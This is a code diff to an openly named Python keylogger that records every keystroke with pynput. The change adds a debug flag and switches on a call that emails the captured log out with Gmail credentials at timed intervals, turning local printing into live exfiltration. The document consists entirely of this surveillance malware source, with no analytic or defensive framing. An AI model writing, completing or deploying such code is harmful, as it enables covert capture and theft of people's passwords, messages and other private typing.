@@ -1,14 +1,20 @@
 import pynput.keyboard
 import threading
-import re
 from util import send_mail
 
 class Keylogger:
-	def __init__(self, interval_seconds, gmail_username, gmail_pw):
+	def __init__(
+			self,
+			interval_seconds,
+			gmail_username,
+			gmail_pw,
+			debug_mode
+		):
 		self.TEXT_LOG = ""
 		self.interval_seconds = interval_seconds
 		self.gmail_username = gmail_username
 		self.gmail_pw = gmail_pw
+		self.debug_mode = debug_mode
 
 	def start(self):
 		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
@@ -17,25 +23,14 @@ class Keylogger:
 			kbl.join()
 
 	def process_keystroke(self, key):
-		try:
-			current_key = str(key.char)
-		except AttributeError:
-			keymap = {
-				"backspace": self.backspace_log(),
-				"space": self.append_log(" "),
-				"enter": self.append_log("\n")
-			}
-			if key not in keymap:
-				current_key = str(key).split(".")[1].upper()
-			else:
-				
-		if current_key:
-			self.append_log(current_key)
-
-	def backspace_log(self):
-		# Only backspace if last character was alphanumeric
-		if self.TEXT_LOG[-1:].isalnum():
-			self.TEXT_LOG = self.TEXT_LOG[:-1]
+		if hasattr(key, 'char'):
+			return self.append_log(str(key.char))
+		else:
+			special_key = str(key).split(".")[1]
+			if special_key == "space":
+				self.append_log(" ")
+			if special_key == "enter":
+				self.append_log("\n")
 
 	def append_log(self, string):
 		self.TEXT_LOG += string
@@ -44,8 +39,10 @@ class Keylogger:
 		self.TEXT_LOG = ""
 
 	def send_log(self):
-		# send_mail(email=self.gmail_username, password=self.gmail_pw, message=self.LOG)
-		print(self.TEXT_LOG)
+		if self.debug_mode is False:
+			send_mail(email=self.gmail_username, password=self.gmail_pw, message=self.TEXT_LOG)
+		else:
+			print(self.TEXT_LOG)
 		self.clear_log()
 		
 	def report(self):
